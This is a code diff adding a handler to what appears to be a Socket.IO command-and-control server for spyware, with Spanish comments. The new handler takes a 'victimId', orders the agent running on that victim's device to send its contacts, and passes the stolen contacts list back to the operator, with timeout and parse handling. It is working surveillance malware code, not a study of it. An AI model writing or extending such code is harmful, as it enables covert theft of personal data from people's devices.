@@ -363,6 +363,51 @@ io.on('connection', socket => {
     });
   });
 
+  // Handler para obtener contactos
+  socket.on('get-contacts', ({ victimId }) => {
+    console.log(`LOG [CONTACTS] get-contacts recibido para: ${victimId}`);
+    const [ip, port] = victimId.split(':');
+    const dynIO = dynamicSocketIOs[port];
+    if (!dynIO) {
+      console.log(`LOG [CONTACTS] No hay dynIO para puerto: ${port}, victimId: ${victimId}`);
+      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
+      return;
+    }
+
+    const agents = Array.from(dynIO.sockets.sockets.values());
+    console.log(`LOG [CONTACTS] Agentes conectados en puerto ${port}: ${agents.length}`);
+    if (!agents.length) {
+      console.log(`LOG [CONTACTS] No hay agentes conectados en puerto: ${port}`);
+      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
+      return;
+    }
+
+    const agent = agents[0];
+    console.log(`LOG [CONTACTS] Enviando get-contacts a agente [id=${agent.id}] en puerto: ${port}`);
+
+    agent.emit('get-contacts', {});
+
+    const timeout = setTimeout(() => {
+      console.log(`LOG [CONTACTS] Timeout esperando contacts-data del agente en puerto ${port}`);
+      socket.emit('contacts-data', { error: "Timeout", contactsList: [] });
+    }, 5000);
+
+    agent.once('contacts-data', (data) => {
+      clearTimeout(timeout);
+      console.log(`LOG [CONTACTS] Respuesta contacts-data recibida del agente en puerto ${port}`);
+      let parsedData = data;
+      if (typeof data === 'string') {
+        try {
+          parsedData = JSON.parse(data);
+        } catch (e) {
+          console.error('LOG [CONTACTS] Error parseando contacts-data:', e, data);
+          parsedData = { error: "Parse error", contactsList: [] };
+        }
+      }
+      socket.emit('contacts-data', parsedData ?? { error: "No data", contactsList: [] });
+    });
+  });
+
   // ...otros handlers...
 });
 
